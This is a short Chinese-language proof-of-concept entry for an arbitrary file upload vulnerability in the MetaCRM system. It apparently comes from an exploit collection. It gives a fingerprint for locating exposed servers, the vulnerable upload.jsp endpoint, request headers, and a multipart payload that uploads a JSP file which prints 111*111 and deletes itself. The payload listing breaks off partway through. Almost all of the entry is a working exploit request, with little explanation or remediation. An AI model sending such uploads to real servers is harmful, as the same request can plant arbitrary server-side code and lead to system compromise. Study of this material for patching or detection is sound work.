# MetaCRM客户关系管理系统任意文件上传漏洞

- **系统**：MetaCRM　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`body="/common/scripts/basic.js"`
- **请求**：`POST /develop/systparam/softlogo/upload.jsp?key=null&form=null&field=null&filetitle=null&folder=null HTTP/1.1`
- **关键头**：`Content-Length: 693`　`Content-Type: multipart/form-data; boundary=----nailyv7mhcqv7owyijct`　`Cookie: JSESSIONID=BB6683CBD0480EE51F5995A506DCD4AD`　`Range: bytes=0-100`

**请求体 / payload**
```
------nailyv7mhcqv7owyijct
Content-Disposition: form-data; name="file"; filename="dumenfuapi.jsp"
Content-Type: application/octet-stream
<%out.println(111*111);new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
------nailyv7mhcqv7owyijct
Content-Disposition: form-data; name="key"
null
------nailyv7mhcqv7owyijct
Content-Disposition: form-data; name="form"
null
------nailyv7mhcqv7owyijct
Content-Disposition: form-data; name="field"
null
------nailyv7mhcqv7owyijct
Content-Disposition: form-data; name="filetitile"
null
------nailyv7mhcqv7owyijct
Content-Disposition: fo…（脚本共 660 字，完整版见原文）
```